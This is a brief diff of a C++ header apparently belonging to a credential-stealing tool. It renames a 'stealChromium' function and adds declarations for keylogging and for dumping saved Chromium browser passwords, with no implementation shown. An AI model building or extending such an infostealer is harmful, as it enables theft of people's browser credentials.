@@ -2,5 +2,6 @@
 #include <string>
 
 namespace credential {
-std::string stealChromium();
+    void KeylogChromium(); // Placeholder if needed
+    std::string DumpChromiumPasswords();
 }
